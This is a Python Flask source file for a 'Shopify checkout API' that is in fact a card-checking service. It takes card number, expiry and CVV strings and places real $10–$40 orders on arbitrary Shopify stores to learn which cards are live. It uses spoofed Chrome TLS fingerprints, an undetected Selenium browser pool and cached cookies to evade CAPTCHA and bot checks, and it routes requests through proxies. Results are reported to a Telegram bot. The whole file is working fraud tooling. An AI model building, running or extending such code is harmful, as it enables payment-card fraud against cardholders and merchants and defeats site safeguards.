#!/usr/bin/env python3
"""
api.py — Shopi Hybrid Shopify Checkout API v2.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Primary path  : curl_cffi + Chrome TLS fingerprint via shopifyapi.py
                Fast (~3–10 s/card), high concurrency, full GraphQL flow.
CAPTCHA path  : Selenium browser pool (2–3 Chrome instances).
                Activates only when CheckpointDenied / CAPTCHA_REQUIRED is
                detected on the primary path (~20 % of stores). Non-blocking:
                delegates to a dedicated ThreadPoolExecutor so the asyncio
                event loop never stalls.

Response format (Telegram-bot compatible):
  Gateway      : str   e.g. "Shopify Payments"
  Price        : float e.g. 19.99
  Response     : str   e.g. "ORDER_PLACED" | "INSUFFICIENT_FUNDS" |
                        "3DS_REQUIRED" | "CARD_DECLINED" | …
  Status       : bool  True  = card live (charged / approved)
                        False = declined / error
  challenge_url: str   (optional, only present for 3DS_REQUIRED)
  cc           : str   echo of the cc parameter
"""

import asyncio
import json
import logging
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Optional
from urllib.parse import urlparse

from flask import Flask, jsonify, request

# ─────────────────────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# PRIMARY: Import the curl_cffi checkout engine from shopifyapi.py
# ─────────────────────────────────────────────────────────────────────────────
_SHOPIFYAPI_AVAILABLE = False
_CURL_CFFI_AVAILABLE = False
_is_captcha_result = None
format_proxy = None
ShopifyAuto = None

try:
    from shopifyapi import (
        ShopifyAuto as _ShopifyAuto,
        _CURL_CFFI_AVAILABLE as _CCA,
        _is_captcha_result as _icr,
        format_proxy as _fp,
        run_shopify_check as _http_run_shopify_check,
    )
    ShopifyAuto = _ShopifyAuto
    _CURL_CFFI_AVAILABLE = _CCA
    _is_captcha_result = _icr
    format_proxy = _fp
    _SHOPIFYAPI_AVAILABLE = True
    print("[api] ✅ shopifyapi loaded — curl_cffi primary active")
except ImportError as _e:
    print(f"[api] ❌ shopifyapi import failed: {_e}")
    print("[api]    CAPTCHA fallback will still work; HTTP checkout disabled.")


def _dummy_is_captcha(r):
    if not r or not isinstance(r, dict):
        return False
    code = str(r.get("error_code", "")).upper()
    msg = str(r.get("message", "")).upper()
    return "CAPTCHA" in code or "CAPTCHA" in msg or "CHECKPOINT" in code

if _is_captcha_result is None:
    _is_captcha_result = _dummy_is_captcha

# ─────────────────────────────────────────────────────────────────────────────
# SELENIUM AVAILABILITY CHECK
# ─────────────────────────────────────────────────────────────────────────────
_uc_available = False
_selenium_available = False

try:
    import undetected_chromedriver as uc
    _uc_available = True
    print("[api] ✅ undetected_chromedriver loaded")
except (ImportError, SyntaxError):
    try:
        from selenium import webdriver as _webdriver  # noqa: F401
        print("[api] ⚠️  undetected_chromedriver missing — using standard selenium")
    except ImportError:
        print("[api] ⚠️  selenium not installed — CAPTCHA browser fallback disabled")

try:
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait
    _selenium_available = True
except ImportError:
    pass

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
_BROWSER_POOL_SIZE = 2      # Chrome instances in the fallback pool
_BROWSER_CHECKOUT_TIMEOUT = 90  # seconds to wait for a browser checkout slot
_COOKIE_CACHE_TTL = 3600    # seconds to cache per-site CAPTCHA-bypass cookies

# Product price range used by both the HTTP and browser checkout paths
# (must match shopifyapi._do_one_check range of $10–$40)
_PRODUCT_MIN_PRICE = 10.0
_PRODUCT_MAX_PRICE = 40.0

# ─────────────────────────────────────────────────────────────────────────────
# SELENIUM BROWSER POOL
# ─────────────────────────────────────────────────────────────────────────────

class _SeleniumBrowserPool:
    """
    A pool of N Chrome browser instances for CAPTCHA bypass.

    Architecture
    ────────────
    • Each worker thread in the ThreadPoolExecutor owns one browser (thread-local).
    • asyncio.get_event_loop().run_in_executor(executor, func) submits work to
      the pool without blocking the event loop.
    • pool_size == ThreadPoolExecutor.max_workers == number of Chrome instances.
    """

    def __init__(self, pool_size: int = _BROWSER_POOL_SIZE):
        self.pool_size = pool_size
        # Dedicated executor — its threads each own one browser via _local
        self._executor = ThreadPoolExecutor(
            max_workers=pool_size,
            thread_name_prefix="selenium_browser",
        )
        self._local = threading.local()  # thread-local Chrome driver storage
        logger.info("[BrowserPool] Initialized (%d slot(s))", pool_size)

    # ── Driver management ────────────────────────────────────────────────────

    def _get_driver(self, proxy_url: Optional[str] = None):
        """Return (or recreate) the Chrome driver for the current thread."""
        driver = getattr(self._local, "driver", None)
        # Probe liveness
        if driver is not None:
            try:
                _ = driver.current_url  # raises if dead
                return driver
            except Exception:
                try:
                    driver.quit()
                except Exception:
                    pass
                self._local.driver = None

        # Create new driver for this thread
        self._local.driver = self._create_driver(proxy_url)
        return self._local.driver

    def _create_driver(self, proxy_url: Optional[str] = None):
        """Create a Chrome driver with stealth settings."""
        chrome_args = [
            "--disable-blink-features=AutomationControlled",
            "--disable-dev-shm-usage",
            "--no-sandbox",
            "--disable-gpu",
            "--disable-software-rasterizer",
            "--window-size=1366,768",
            "--disable-extensions",
            "--disable-infobars",
            "--disable-popup-blocking",
        ]
        if proxy_url:
            # Extract host:port for Chrome proxy-server arg
            m = re.search(r'(?:https?://)?(?:[^@]+@)?([^/]+)', proxy_url)
            if m:
                chrome_args.append(f"--proxy-server={m.group(1)}")

        if _uc_available:
            opts = uc.ChromeOptions()
            for a in chrome_args:
                opts.add_argument(a)
            driver = uc.Chrome(options=opts, use_subprocess=True)
        elif _selenium_available:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            opts = Options()
            for a in chrome_args:
                opts.add_argument(a)
            driver = webdriver.Chrome(options=opts)
        else:
            raise RuntimeError("No Selenium driver available")

        driver.set_page_load_timeout(30)
        driver.implicitly_wait(0)  # use explicit waits only
        logger.info("[BrowserPool:%s] Created Chrome driver", threading.current_thread().name)
        return driver

    # ── Checkout logic (runs synchronously inside a worker thread) ───────────

    def _checkout_sync(
        self,
        site_url: str,
        cc: str,
        mon: str,
        year: str,
        cvv: str,
        info: dict,
        proxy_url: Optional[str] = None,
    ) -> dict:
        """
        Full browser checkout — navigates, fills shipping+payment, submits.
        Runs in a ThreadPoolExecutor thread; never called from the event loop directly.
        Returns a dict shaped like shopifyapi's result dicts so _translate_result works.
        """
        try:
            driver = self._get_driver(proxy_url)
            wait = WebDriverWait(driver, 15)

            # ── 1. Find a product ────────────────────────────────────────────
            driver.get(site_url + "/products.json")
            time.sleep(0.6)
            try:
                raw = driver.find_element(By.TAG_NAME, "pre").text
                data = json.loads(raw)
                products = data.get("products", [])
            except Exception as e:
                return {"status": "Error", "message": f"Products fetch: {e}"}

            variant_id = None
            price_str = "0.00"
            for p in products:
                for v in p.get("variants", []):
                    try:
                        pv = float(v.get("price", "0") or "0")
                        if _PRODUCT_MIN_PRICE <= pv <= _PRODUCT_MAX_PRICE:
                            variant_id = v["id"]
                            price_str = v["price"]
                            break
                    except (ValueError, TypeError):
                        continue
                if variant_id:
                    break

            if not variant_id:
                return {"status": "Error", "message": "No products in $10–$40 range"}

            # ── 2. Add to cart ────────────────────────────────────────────────
            driver.get(f"{site_url}/cart/add?id={variant_id}&quantity=1")
            time.sleep(1.0)

            # ── 3. Navigate to checkout ───────────────────────────────────────
            driver.get(f"{site_url}/checkout")
            time.sleep(2.5)

            # ── 4. Handle CAPTCHA / checkpoint page ───────────────────────────
            for _ in range(20):  # wait up to 40 s for checkpoint to clear
                cur = driver.current_url.lower()
                if "checkpoint" not in cur and "captcha" not in cur:
                    break
                time.sleep(2.0)
            else:
                cur = driver.current_url.lower()
                if "checkpoint" in cur or "captcha" in cur:
                    return {
                        "status": "Error",
                        "message": "CAPTCHA not resolved by browser",
                        "error_code": "CAPTCHA_REQUIRED",
                    }

            # ── 5. Fill contact / shipping form ──────────────────────────────
            self._fill_shipping(driver, wait, info)

            # ── 6. Fill payment form ──────────────────────────────────────────
            time.sleep(1.5)
            self._fill_payment(driver, wait, cc, mon, year, cvv)
            time.sleep(2.5)

            # ── 7. Extract cookies (for future CAPTCHA bypass on same site) ──
            try:
                cookies = {c["name"]: c["value"] for c in driver.get_cookies()}
            except Exception:
                cookies = {}

            # ── 8. Determine result from final URL / page text ───────────────
            final_url = driver.current_url.lower()
            try:
                page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
            except Exception:
                page_text = ""

            if "/thank" in final_url or "/orders/" in final_url:
                return {
                    "status": "Charged",
                    "message": "CARD CHARGED",
                    "price": price_str,
                    "gateway": "Shopify Payments",
                    "cookies": cookies,
                }
            if "3ds" in final_url or "challenge" in final_url or "action_required" in page_text:
                return {
                    "status": "Approved",
                    "message": "3DS Required",
                    "error_code": "3DS_REQUIRED",
                    "price": price_str,
                    "gateway": "Shopify Payments",
                    "challenge_url": driver.current_url,
                    "cookies": cookies,
                }
            if "insufficient" in page_text:
                return {
                    "status": "Approved",
                    "message": "Card live (insufficient funds)",
                    "error_code": "INSUFFICIENT_FUNDS",
                    "price": price_str,
                    "gateway": "Shopify Payments",
                    "cookies": cookies,
                }
            if any(kw in page_text for kw in ("declined", "do not honor", "card was declined")):
                return {
                    "status": "Declined",
                    "message": "Card declined",
                    "error_code": "CARD_DECLINED",
                    "price": price_str,
                    "gateway": "Shopify Payments",
                    "cookies": cookies,
                }
            # Unknown outcome
            return {
                "status": "Error",
                "message": f"Unknown browser result: {final_url[:80]}",
                "price": price_str,
                "gateway": "Shopify Payments",
                "cookies": cookies,
            }

        except Exception as e:
            logger.error("[BrowserPool] checkout_sync error: %s", e)
            # Kill the broken driver so it gets recreated on next use
            try:
                d = getattr(self._local, "driver", None)
                if d:
                    d.quit()
            except Exception:
                pass
            self._local.driver = None
            return {"status": "Error", "message": f"Browser error: {str(e)[:100]}"}

    # ── Form helpers ─────────────────────────────────────────────────────────

    @staticmethod
    def _try_fill(driver, selectors: list, value: str):
        """Try multiple CSS selectors to find a field and fill it."""
        for sel in selectors:
            try:
                el = driver.find_element(By.CSS_SELECTOR, sel)
                el.clear()
                el.send_keys(value)
                return True
            except Exception:
                continue
        return False

    def _fill_shipping(self, driver, wait, info: dict):
        """Fill contact + shipping address form fields."""
        # Email / contact
        self._try_fill(driver, [
            'input[type="email"]',
            'input[name="email"]',
            'input[autocomplete="email"]',
        ], info.get("email", "test@example.com"))

        # First name
        self._try_fill(driver, [
            'input[autocomplete="given-name"]',
            'input[name="firstName"]',
            'input[name="first_name"]',
        ], info.get("fname", "John"))

        # Last name
        self._try_fill(driver, [
            'input[autocomplete="family-name"]',
            'input[name="lastName"]',
            'input[name="last_name"]',
        ], info.get("lname", "Smith"))

        # Address 1
        self._try_fill(driver, [
            'input[autocomplete="address-line1"]',
            'input[name="address1"]',
        ], info.get("add1", "123 Main St"))

        # City
        self._try_fill(driver, [
            'input[autocomplete="address-level2"]',
            'input[name="city"]',
        ], info.get("city", "Portland"))

        # ZIP
        self._try_fill(driver, [
            'input[autocomplete="postal-code"]',
            'input[name="postalCode"]',
            'input[name="zip"]',
        ], str(info.get("zip", "04101")))

        # Phone
        self._try_fill(driver, [
            'input[autocomplete="tel"]',
            'input[name="phone"]',
        ], info.get("phone", "2025550199"))

        # State (select element)
        try:
            from selenium.webdriver.support.ui import Select as _Select
            sel_el = driver.find_element(By.CSS_SELECTOR,
                'select[name="zone"], select[autocomplete="address-level1"]')
            sel = _Select(sel_el)
            for opt in sel.options:
                if info.get("state_short", "") in (opt.get_attribute("value") or ""):
                    sel.select_by_value(opt.get_attribute("value"))
                    break
        except Exception:
            pass

        # Click "Continue" button
        try:
            btn = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
            btn.click()
            time.sleep(2.0)
        except Exception:
            pass

    def _fill_payment(self, driver, wait, cc: str, mon: str, year: str, cvv: str):
        """Fill card details — handles both direct fields and iframes."""
        # Try direct fields first
        filled = self._try_fill(driver, [
            'input[name="number"]',
            'input[autocomplete="cc-number"]',
            'input[data-testid="card-number"]',
        ], cc)

        if not filled:
            # Check for payment iframe
            iframes = driver.find_elements(By.TAG_NAME, "iframe")
            for iframe in iframes:
                try:
                    src = (iframe.get_attribute("src") or "").lower()
                    name = (iframe.get_attribute("name") or "").lower()
                    if any(kw in src or kw in name for kw in ("payment", "shopify", "card")):
                        driver.switch_to.frame(iframe)
                        try:
                            self._try_fill(driver, ['input[name="number"]', 'input[autocomplete="cc-number"]'], cc)
                            self._try_fill(driver, ['input[name="expiry"]', 'input[autocomplete="cc-exp"]'],
                                           f"{mon}/{year[-2:]}")
                            self._try_fill(driver, ['input[name="verificationValue"]', 'input[autocomplete="cc-csc"]'],
                                           cvv)
                        finally:
                            driver.switch_to.default_content()
                        break
                except Exception:
                    driver.switch_to.default_content()
        else:
            # Direct fields — fill expiry and CVV
            self._try_fill(driver, [
                'input[name="expiry"]',
                'input[autocomplete="cc-exp"]',
            ], f"{mon}/{year[-2:]}")
            self._try_fill(driver, [
                'input[name="verificationValue"]',
                'input[autocomplete="cc-csc"]',
                'input[name="cvv"]',
            ], cvv)

        # Click Pay button
        try:
            pay_btn = driver.find_element(By.CSS_SELECTOR,
                'button[type="submit"], button[data-trekkie-id="complete_order_button"]')
            pay_btn.click()
            time.sleep(3.0)
        except Exception:
            pass

    # ── Async entry point ────────────────────────────────────────────────────

    async def run_checkout(
        self,
        site_url: str,
        cc: str,
        mon: str,
        year: str,
        cvv: str,
        proxy_url: Optional[str] = None,
    ) -> dict:
        """
        Non-blocking browser checkout.
        Submits synchronous Selenium work to the dedicated ThreadPoolExecutor
        so the asyncio event loop is never blocked.
        """
        if not _selenium_available:
            return {
                "status": "Error",
                "message": "Selenium not available",
                "error_code": "SELENIUM_UNAVAILABLE",
            }

        info = (
            ShopifyAuto().get_random_info()
            if ShopifyAuto is not None
            else {
                "fname": "John", "lname": "Smith",
                "email": f"john{random.randint(1,9999)}@gmail.com",
                "phone": "2025550199", "add1": "123 Main St",
                "city": "Portland", "state_short": "ME", "zip": "04101",
            }
        )

        loop = asyncio.get_event_loop()
        try:
            result = await asyncio.wait_for(
                loop.run_in_executor(
                    self._executor,
                    self._checkout_sync,
                    site_url, cc, mon, year, cvv, info, proxy_url,
                ),
                timeout=float(_BROWSER_CHECKOUT_TIMEOUT),
            )
            return result
        except asyncio.TimeoutError:
            return {"status": "Error", "message": "Browser checkout timed out", "error_code": "BROWSER_TIMEOUT"}
        except Exception as e:
            return {"status": "Error", "message": f"Browser pool error: {str(e)[:100]}"}

    def shutdown(self):
        """Gracefully close all Chrome instances and stop the executor."""
        logger.info("[BrowserPool] Shutting down…")
        # Ask each executor thread to close its browser
        futs = [
            self._executor.submit(self._close_local_driver)
            for _ in range(self.pool_size)
        ]
        for f in futs:
            try:
                f.result(timeout=5)
            except Exception:
                pass
        self._executor.shutdown(wait=False)

    def _close_local_driver(self):
        d = getattr(self._local, "driver", None)
        if d:
            try:
                d.quit()
            except Exception:
                pass
        self._local.driver = None


# ── Global browser pool (lazy init, thread-safe) ──────────────────────────────
_browser_pool: Optional[_SeleniumBrowserPool] = None
_pool_init_lock = threading.Lock()


def _get_browser_pool() -> _SeleniumBrowserPool:
    global _browser_pool
    if _browser_pool is None:
        with _pool_init_lock:
            if _browser_pool is None:
                _browser_pool = _SeleniumBrowserPool(_BROWSER_POOL_SIZE)
    return _browser_pool


# ─────────────────────────────────────────────────────────────────────────────
# COOKIE CACHE — persist CAPTCHA-bypass cookies per site (1-hour TTL)
# ─────────────────────────────────────────────────────────────────────────────
_cookie_cache: Dict[str, dict] = {}
_cookie_cache_ts: Dict[str, float] = {}


def _cache_cookies(site_url: str, cookies: dict) -> None:
    if cookies:
        _cookie_cache[site_url] = dict(cookies)
        _cookie_cache_ts[site_url] = time.time()
        logger.info("[CookieCache] Stored %d cookies for %s", len(cookies), site_url)


def _get_cached_cookies(site_url: str) -> Optional[dict]:
    ts = _cookie_cache_ts.get(site_url)
    if ts and (time.time() - ts) < _COOKIE_CACHE_TTL:
        return _cookie_cache.get(site_url)
    return None


# ─────────────────────────────────────────────────────────────────────────────
# RESULT TRANSLATION  shopifyapi dict → bot-compatible JSON
# ─────────────────────────────────────────────────────────────────────────────

def _extract_clean_code(message: str) -> str:
    """
    Extract a short, uppercase error/response code from a free-text message.
    Preserves sentinel strings that must not be truncated by the regex.
    """
    if not message:
        return "UNKNOWN_ERROR"
    _PRESERVE = [
        "3DS_REQUIRED", "DS_REQUIRED",    # 3DS variants
        "ORDER_PLACED",
        "CAPTCHA_REQUIRED",
        "INSUFFICIENT_FUNDS",
        "OTP_REQUIRED",
    ]
    msg_upper = message.upper()
    for s in _PRESERVE:
        if re.search(r'(?<![A-Z0-9_])' + re.escape(s) + r'(?![A-Z0-9_])', msg_upper):
            # Normalise both "3DS_REQUIRED" and "DS_REQUIRED" to the canonical form
            return "3DS_REQUIRED" if s in ("3DS_REQUIRED", "DS_REQUIRED") else s
    m = re.search(r'\b([A-Z][A-Z0-9_]{3,}(?:_[A-Z0-9]+)+)\b', message)
    if m:
        return m.group(1)
    return message[:50].strip()


def _translate_result(shop_result: dict, cc_string: str) -> dict:
    """
    Convert a shopifyapi-style result dict into the JSON the Telegram bot expects.

    shopifyapi statuses:
      Charged  → Status=True,  Response="ORDER_PLACED"
      Approved → Status=True,  Response=error_code (e.g. "INSUFFICIENT_FUNDS", "3DS_REQUIRED")
      Declined → Status=False, Response=error_code
      Error    → Status=False, Response=<extracted code>

    3DS special case: extract challenge_url from raw_receipt.action.offsiteRedirect
    or raw_receipt.action.url (populated by the PollForReceipt GraphQL response).
    """
    status = shop_result.get("status", "Error")
    error_code = (shop_result.get("error_code") or "").strip()
    message = (shop_result.get("message") or "").strip()
    price_raw = shop_result.get("price") or "0.00"
    gateway = shop_result.get("gateway") or "Shopify Payments"

    # ── Extract challenge URL (for 3DS) ──────────────────────────────────────
    challenge_url = shop_result.get("challenge_url") or ""
    raw_receipt = shop_result.get("raw_receipt") or {}
    if not challenge_url:
        action = raw_receipt.get("action") or {}
        challenge_url = action.get("offsiteRedirect") or action.get("url") or ""

    # ── Determine Response code and Status bool ──────────────────────────────
    if status == "Charged":
        response_code = "ORDER_PLACED"
        is_live = True

    elif status == "Approved":
        # Normalise 3DS variants — API may return "3DS_REQUIRED", "DS_REQUIRED", or "3DS Required"
        ec_upper = error_code.upper()
        if "3DS_REQUIRED" in ec_upper or "DS_REQUIRED" in ec_upper:
            response_code = "3DS_REQUIRED"
        elif "INSUFFICIENT" in ec_upper:
            response_code = "INSUFFICIENT_FUNDS"
        elif error_code:
            response_code = error_code
        else:
            response_code = _extract_clean_code(message) or "APPROVED"
        is_live = True

    elif status == "Declined":
        response_code = error_code or _extract_clean_code(message) or "CARD_DECLINED"
        is_live = False

    else:  # Error
        response_code = error_code or _extract_clean_code(message) or "ERROR"
        is_live = False

    # ── Parse price ──────────────────────────────────────────────────────────
    try:
        price_float = float(str(price_raw).replace("$", "").replace(",", "").strip())
    except (ValueError, TypeError):
        price_float = 0.0

    out: dict = {
        "Gateway": gateway,
        "Price": price_float,
        "Response": response_code,
        "Status": is_live,
        "cc": cc_string,
    }
    if challenge_url:
        out["challenge_url"] = challenge_url
    return out


# ─────────────────────────────────────────────────────────────────────────────
# MAIN ASYNC CHECK ORCHESTRATOR
# ─────────────────────────────────────────────────────────────────────────────

async def run_check(
    site_url: str,
    cc_string: str,
    proxy_url: Optional[str] = None,
) -> dict:
    """
    Orchestrate one Shopify card check:
      1. Primary: curl_cffi HTTP checkout via shopifyapi.run_shopify_check
      2. CAPTCHA fallback: Selenium browser pool (non-blocking)
      3. Cache cookies from successful browser checkouts for future reuse
    """
    if not _SHOPIFYAPI_AVAILABLE:
        return {
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": "ERROR_NO_BACKEND",
            "Status": False,
            "cc": cc_string,
        }

    # ── Primary HTTP path ────────────────────────────────────────────────────
    try:
        http_result = await _http_run_shopify_check(
            site_url,
            cc_string,
            proxy_url=proxy_url,
            verbose=False,
            timeout=90.0,
            # Disable shopifyapi's internal CAPTCHA retries; we handle it here
            max_captcha_retries=0,
        )
    except Exception as e:
        logger.warning("[api] Primary HTTP check exception: %s", e)
        http_result = {"status": "Error", "message": str(e)[:120]}

    # ── If NOT a CAPTCHA: translate and return ───────────────────────────────
    if not _is_captcha_result(http_result):
        return _translate_result(http_result, cc_string)

    # ── CAPTCHA detected ─────────────────────────────────────────────────────
    logger.info("[api] CAPTCHA on %s — activating browser fallback", site_url)

    if not _selenium_available:
        # No browser — return CAPTCHA error so the bot knows to skip this site
        out = _translate_result(http_result, cc_string)
        out["Response"] = "CAPTCHA_REQUIRED"
        out["Status"] = False
        return out

    # Parse card parts
    parts = cc_string.strip().split("|")
    if len(parts) != 4:
        return {
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": "ERROR_INVALID_CC",
            "Status": False,
            "cc": cc_string,
        }
    cc, mon, year, cvv = parts

    pool = _get_browser_pool()
    browser_result = await pool.run_checkout(site_url, cc, mon, year, cvv, proxy_url)

    # Cache cookies on successful browser checkout (skip next CAPTCHA on same site)
    cookies = browser_result.pop("cookies", None)
    if cookies and browser_result.get("status") in ("Charged", "Approved", "Declined"):
        _cache_cookies(site_url, cookies)

    return _translate_result(browser_result, cc_string)


# ─────────────────────────────────────────────────────────────────────────────
# FLASK APPLICATION
# ─────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)


@app.route("/shopify", methods=["GET"])
def shopify_checker():
    """
    GET /shopify?site=<url>&cc=<CC|MM|YYYY|CVV>[&proxy=<proxy>]

    Returns bot-compatible JSON:
      { Gateway, Price, Response, Status, cc [, challenge_url] }
    """
    try:
        site = (request.args.get("site") or "").strip()
        cc_string = (request.args.get("cc") or "").strip()
        proxy_str = (request.args.get("proxy") or "").strip() or None

        # ── Validate params ──────────────────────────────────────────────────
        if not site:
            return jsonify({"error": "Missing 'site' parameter", "Status": False}), 400
        if not cc_string or cc_string.count("|") != 3:
            return jsonify({
                "error": "Missing or invalid 'cc' — expected CC|MM|YYYY|CVV",
                "Status": False,
            }), 400

        # Normalise site URL
        if not site.startswith("http"):
            site = "https://" + site
        site = site.rstrip("/")

        # Format proxy
        formatted_proxy: Optional[str] = None
        if proxy_str and format_proxy is not None:
            try:
                formatted_proxy = format_proxy(proxy_str)
            except Exception:
                formatted_proxy = proxy_str

        # ── Run async check on a fresh event loop per request ────────────────
        # asyncio.run() (Python 3.7+) creates a loop, runs the coroutine, then
        # closes and cleans up the loop automatically — safer than the manual
        # new_event_loop / close pattern. For high-throughput deployments use
        # gunicorn with gevent/eventlet workers or an ASGI bridge.
        result = asyncio.run(run_check(site, cc_string, formatted_proxy))

        return jsonify(result)

    except Exception as e:
        # Log the full exception server-side but do not expose internals to clients
        logger.exception("Unhandled error in /shopify")
        return jsonify({
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": "SERVER_ERROR",
            "Status": False,
            "cc": request.args.get("cc", ""),
        }), 500


@app.route("/health", methods=["GET"])
def health():
    pool = _browser_pool
    return jsonify({
        "status": "ok",
        "version": "hybrid-2.0",
        "primary": "curl_cffi" if _CURL_CFFI_AVAILABLE else "httpx",
        "captcha_fallback": "selenium" if _selenium_available else "disabled",
        "browser_pool_size": _BROWSER_POOL_SIZE if _selenium_available else 0,
        "browsers_initialized": pool is not None,
        "cookie_cache_entries": len(_cookie_cache),
    })


@app.route("/", methods=["GET"])
def index():
    return jsonify({
        "name": "Shopi Hybrid API",
        "version": "2.0",
        "endpoints": ["/shopify", "/health"],
        "description": "curl_cffi primary + Selenium CAPTCHA fallback",
    })


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("  Shopi Hybrid API v2.0")
    print("=" * 60)
    print(f"  Primary  : {'curl_cffi (Chrome TLS fingerprint)' if _CURL_CFFI_AVAILABLE else 'httpx (CAPTCHA risk higher)'}")
    print(f"  Fallback : {'Selenium ×' + str(_BROWSER_POOL_SIZE) + ' browsers' if _selenium_available else 'DISABLED (install selenium)'}")
    print(f"  Port     : 5000")
    print()

    # Pre-warm browser pool in a background thread so the first CAPTCHA request
    # does not incur Chrome startup latency
    if _selenium_available:
        def _prewarm():
            try:
                pool = _get_browser_pool()
                # Submit a no-op to each executor thread to start Chrome early
                futs = [
                    pool._executor.submit(pool._get_driver)
                    for _ in range(pool.pool_size)
                ]
                for f in futs:
                    try:
                        f.result(timeout=30)
                    except Exception:
                        pass
                logger.info("[api] Browser pool pre-warmed (%d instances)", pool.pool_size)
            except Exception as e:
                logger.warning("[api] Browser pre-warm failed: %s", e)

        threading.Thread(target=_prewarm, daemon=True, name="prewarm").start()

    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
